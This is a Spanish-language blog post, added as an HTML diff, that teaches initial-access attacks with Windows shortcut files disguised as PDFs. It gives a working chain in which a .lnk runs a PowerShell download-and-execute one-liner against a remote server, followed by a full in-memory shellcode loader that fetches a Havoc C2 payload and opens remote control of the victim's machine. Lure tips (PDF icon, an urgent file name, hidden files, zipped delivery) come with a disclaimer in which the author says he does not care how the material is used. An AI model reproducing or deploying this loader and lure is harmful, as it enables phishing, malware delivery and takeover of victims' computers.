@@ -1,0 +1,122 @@
+<h2>Introducción</h2>
+<p>Los atacantes son bastante creativos a la hora de conseguir acceso inicial. Debido a la evolución de la seguridad, conseguir acceso mediante ejecutables comunes (.exe) ha demostrado ser poco viable, políticas de control empresarial y antivirus agresivos han dejado (casi) muerta esta vía de entrada para la intrusión de sistemas. Aún así, los atacantes no se han quedado cortos, en este post exploraremos una de las vias más comunes explotadas <em>in the wild</em>, esto es; el abuso de los shortcuts en windows (.lnk) para ejecutar binarios arbitrarios. Demostraremos un ataque por etapas, con un falso PDF construido, donde al final conseguiremos control absoluto de la máquina víctima usando <strong>Havoc</strong> como C2 (el lector podrá usar el sistema que quiera, se escogió Havoc de forma arbitraria).</p>
+<h2>Mucho texto bro, dame un resumen:</h2>
+<p>Usando archivos .lnk, le pondremos un icono PDF arbitrario. Como argumento al .lnk usaremos <strong>powershell</strong> para descargar de un servidor un script .ps1 (iwr) y ejecutarlo (iex). Este script descargará un payload de Havoc, lo asemblará en memoria y ejecutará, logrando crear un <em>beacon</em> que nos conecté a la máquina. Opcionalmente podemos redirigir el contenido a un verdadero .pdf en disco, para no levantar sospechas.</p>
+<h2>La travesía de ocultar tus intenciones</h2>
+<p>El objetivo es simple, hacer que un archivo pdf ejecute codigo arbitrario. La forma mas h4ck3r es encontrando una vulnerabilidad en el parser PDF que permita ejecutar código. Lastimosamente es poco práctico, necesitamos saber el software especifíco que el usuario usa para leer pdfs (de los cuales muchas veces es el navegador), encontrar una vulnerabilidad en ese software y craftear el payload específico. Este camino requiere de habilidades propias de un equipo (o individuo) avanzados, así que tendremos que ir por otra ruta: engañar al usuario usando las características de Windows.</p>
+<p>Hablemos un poco de las extensiones de archivos. Windows usa las extensiones (.exe, .pdf, .png, .txt) para saber cómo interpretar un archivo.</p>
+<p>Por defecto, Windows te oculta las extensiones, un usuario arbitrario puede habilitar la opción de observar las extensiones desde el explorador de archivos</p>
+<img src="images/20251113110247.png">
+
+<p>Muchos usuarios ignoran esta opción; para ser honestos, la mayoría de usuarios de Windows no la tienen activada, no les podría importar menos ver las extensiones de sus archivos.</p>
+<p>Esto crea una ruta bastante jugosa de ataque: nombrar tu <code>virus.exe</code> a <code>virus.jpg.exe</code>. El usuario verá la primera extensión <code>virus.jpg</code> y no podrá ver la verdadera extensión </p>
+<img src="images/Pasted image 20251113110512.png">
+calc.exe renombrado a calc.jpg.exe
+
+<p>Aún así, hay usuarios que no son tan tontos. Y por algún motivo u otro tienen activada la opción de observar extensiones, estos usuarios van a atrapar muy facilmente el truco.</p>
+<img src="images/Pasted image 20251113110610.png">
+Ver extensiones habilitada
+
+<p>Imagina la cara de la persona cuando vea que lo intentaste hacer pasar por tonto.</p>
+<p>Aún con esto activado, hay extensiones en windows que nunca son mostradas en la interfaz. Usaremos una de estas extensiones para explotar un sistema</p>
+<p>Puedes ver todas las extensiones que existen por defecto en el sistema desde la llave de registro <code>HKEY_CLASSES_ROOT</code>, las llaves que contengan el valor <code>NeverShowExt</code> nunca mostrarán su extensión desde la interfaz. 
+<img src="images/Pasted image 20251113112134.png">
+Valor <code>NeverShowExt</code> en la llave <code>lnkfile</code></p>
+<p>Practicamente se podría eliminar esta llave y de esta forma ver la extensión siempre. Pero esto es algo que nadie hace.</p>
+<p>Es sencillo realizar un script para observar todas las extensiones que contienen este valor (entre ellas .lnk, .pif, .mad). Muchas de estas no son explotables, o tal vez si lo sean y solo se necesite un poco de investigación :p</p>
+<p>Como hablar de todas las extensiones ocultas se sale del alcance del post, discutiremos una sola: los archivos de atajo (.lnk)</p>
+<h3>Todos los caminos llevan a Roma</h3>
+<p>Si usas Windows, en tu escritorio lo más probable es que tengas archivos así:</p>
+<img src="images/Pasted image 20251113113006.png">
+
+<p>Notas la flecha por debajo? Esto se le llama un &quot;Atajo&quot; (shortcut link en ingles), su función es redirigirte al archivo real, de esta forma puedes tener atajos en varias partes del sistema sin tener que copiar el mismo archivo. Bastante conveniente, verdad?</p>
+<p>Revisemos las propiedades de este archivo, para saber qué hace.</p>
+<img src="images/Pasted image 20251113113223.png">
+
+<p>En &quot;Target&quot;, podemos ver el ejecutable exacto al que apunta, que en este caso es <code>&quot;C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe&quot;</code></p>
+<p>Al ejecutarlo, este atajo correrá lo que haya en su Target.</p>
+<p>La estructura binaria del .lnk contiene mucha informacion del archivo en si, para detalles completos, la documentacion de Microsoft es una excelente fuente: <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943</a></p>
+<p>Los valores que nos importan son:</p>
+<p>LINKTARGET_ID_LIST: Especifica la ubicacion del objetivo (a donde apunta el LNK)</p>
+<p>RELATIVE_PATH: Es la ruta que se resuelve si LINKTARGET_IDLIST falla.</p>
+<p>COMMAND_LINE_ARGUMENTS: Proporciona los argumentos para el objetivo</p>
+<img src="images/Pasted image 20251113113946.png">
+
+<p>Para una guia mas profunda del .lnk (y metodos de explotacion), el post de palo alto es recomendada: <a href="https://unit42.paloaltonetworks.com/lnk-malware/">https://unit42.paloaltonetworks.com/lnk-malware/</a></p>
+<p>Ya una vez cubierta la cháchara binaria, vamos a irnos a lo que nos importa.</p>
+<h3>Abusando de los redirectores</h3>
+<p>Ya sabemos que <code>Target</code> apunta al binario en especifico que debe correr el .lnk, así que la pregunta es, qué binario vamos a usar?</p>
+<p>Podemos en la misma ruta de entrega poner un .exe y apuntar el .lnk a este .exe .... Pero esto va contra el propósito inicial: acceso inicial sin depender de .exes externos.</p>
+<p>Entonces vamos a usar binarios legitimos de Windows, que se encuentran en todo sistema. A esta técnica se le llama <code>Living off the land</code>, y es ampliamente explotada por varios actores. Utilizar binarios legitimos nos hace pasar desapercibidos, pues es imposible que un Antivirus detecte un archivo del sistema como malicioso (aunque si puede detectar su uso basado en motores de comportamiento, pero eso es una charla para otro día)</p>
+<p>Para una lista buena de lolbins (living off the land binaries) la siguiente pagina es un excelente recurso, el lector debe tener en cuenta que es un recurso mantenido por usuarios, por lo que puede no ser tan extensa: <a href="https://lolbas-project.github.io/#">https://lolbas-project.github.io/#</a></p>
+<p>El lolbin que usaremos será <code>powershell.exe</code>, detalles en qué es powershell se salen del alcance del post, tambien pudiesemos haber usado <code>mshta.exe</code> <code>forfiles.exe</code> <code>rundll32.exe</code> y un sin fin más, pero para hacer más sencilla la guía decidí no optar por estos.</p>
+<p>Crearemos un .lnk y apuntaremos su target a powershell.exe</p>
+<img src="images/Pasted image 20251113115026.png">
+<img src="images/Pasted image 20251113115039.png">
+
+<p>Le llamamos Archivo importante.pdf y lo guardamos, revisando las propiedades vemos que su target es powershell.exe (se mostrará la ruta completa, lo omití por brevedad)</p>
+<img src="images/Pasted image 20251113115017.png">
+
+<p>Ya con esto tenemos nuestro .lnk apuntando a powershell, le damos doble click y se abrirá una consola powershell.exe</p>
+<img src="images/Pasted image 20251113115141.png">
+
+<p>Excelente, ahora lo que necesitamos es el siguiente paso: ejecutar código arbitrario.</p>
+<p>powershell tiene muchas opciones y podemos ser lo suficientemente creativos para ejecutar código de muchas maneras, es tarea del lector encontrar la ruta que más se adecúe a sus necesidades (y sigilo)</p>
+<p>Para mantenerlo simple haremos el más clásico metodo de ataque, hacer una peticion a un servidor web (Invoke-WebRequest) que contenga un script powershell y ejecutarlo (Invoke-Expression)</p>
+<p>Escribimos un archivo de powershell .ps1 con el contenido &quot;Hello world&quot; y abrimos un servidor web en python para servirlo:</p>
+<img src="images/Pasted image 20251113115549.png">
+<img src="images/Pasted image 20251113115608.png">
+
+<p>Ahora solo tenemos que usar la IP de la maquina y pedir el archivo en /hello.ps1</p>
+<img src="images/Pasted image 20251113115700.png">
+
+<p><code>powershell.exe iwr http://192.168.1.187:8000/hello.ps1 | iex</code></p>
+<p>Usamos iwr (invoke-webrequest) para pedir el archivo hello.ps1 y redirigimos el contenido a iex (invoke-expression) para correr el codigo.</p>
+<p>Probemos si funciona:
+<img src="images/Pasted image 20251113115911.png"></p>
+<p>Excelente! Pero hay un problema... El icóno de powershell es extremadamente sospechoso, ninguna persona clickeará en un &quot;Archivio Importante.pdf&quot; con un ícono así, necesitamos cambiarlo.</p>
+<p>Descargamos un icono .ico de pdf, y lo ponemos en la misma carpeta que el payload, y hacemos que apunte a él</p>
+<img src="images/Pasted image 20251113124006.png">
+
+<p>Perfecto! Tambien renombramos a IMPORTANTE.pdf para darle un aura de urgencia. Ahora el unico problema es ese pdf.ico ahí suelto, podriamos ocultarlo y rezar que nuestra victima no tenga activada el observar archivos ocultos (el usuario común nunca lo tiene activado). Comprimimos la carpeta y la enviamos.</p>
+<p>Ahora el siguiente paso es modificar el .ps1 para hacerlo ejecutar código mas interesante. El lector que sepa lo que hace ya podrá abandonar este post y continuar con sus actividades. Se continuará dando un ejemplo usando Havoc para generar el shellcode y controlar remotamente la máquina.</p>
+<h3>Explotacion con Havoc</h3>
+<p>Pude haber usado metasploit, pero por qué use Havoc? Porque soy hater de Metasploit y me parece más bonito Havoc.</p>
+<p>Este post no se trata de instalar Havoc ni configurar ningún servidor de explotación, esto es tarea del lector, a partir de aqui se asumirá que ya se tiene una infraestructura válida (tanto para servir el .ps1 como para servir el .bin) y un payload en shellcode.</p>
+<p>Primero vamos a hacer el script powershell que se encargará de cargar y ejecutar el shellcode</p>
+<pre><code class="language-powershell"># 1. Obtener el payload
+$buf = (New-Object Net.WebClient).DownloadData(&#39;http://192.168.1.187:8000/demon.bin&#39;)
+
+# 2. Definir prototipos para usar las sfunciones kernel32
+Add-Type -NameSpace Win32 -Name Funcs -MemberDefinition @&#39;
+[DllImport(&quot;kernel32.dll&quot;)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+[DllImport(&quot;kernel32.dll&quot;)] public static extern bool   VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+&#39;@
+
+# 3. Alocar memoria RW -&gt; Copiar shellcode -&gt; Cambiar a RX
+$addr = [Win32.Funcs]::VirtualAlloc([IntPtr]::Zero, $buf.Length, 0x3000, 0x04)
+[Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
+$old = 0
+[Win32.Funcs]::VirtualProtect($addr, $buf.Length, 0x20, [ref]$old) 
+
+# 4. Delegar y correr
+$runner = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, [Action])
+$runner.Invoke()
+</code></pre>
+<p>Este script obtiene el shellcode (que llamaremos demon.bin) y lo guarda en un buffer $buf</p>
+<p>Se importan los tipos para las funciones VirtualAlloc y VirtualProtect que seran usadas para crear la memoria en el proceso.</p>
+<p>VirtualAlloc se usa para reservar memoria, y con VirtualProtect cambiamos la memoria a ejecutable luego de copiar el buffer.</p>
+<p>Con este script + el listener de havoc preparado, ya podemos ejecutar nuestro shellcode</p>
+<img src="images/Pasted image 20251113123204.png">
+
+<p>Corremos en nuestra máquina el IMPORTANTE.pdf y esperamos la conexión:</p>
+<img src="images/Pasted image 20251113123446.png">
+
+<p>Ya tenemos la conexión, intentamos ejecutar <code>whoami</code> para confirmarlo:</p>
+<img src="images/Pasted image 20251113123535.png">
+
+<p>Pwned :)</p>
+<p>El próximo paso sería abrir un PDF legítimo para que el usuario no sospeche, es algo muy sencillo y tengo pereza de hacerlo para este post así que lo omitiré :p</p>
+<h3>Disclaimer</h3>
+<p>No me importa lo que hagas con el conocimiento expuesto aqui, pero por obligación legal, estoy forzado a decirte la obviedad de que no me hago responsable de nada de lo que hagas con esta información, es puramente por propositos informativos. Hackear es ilegal y para nerds.</p>
+
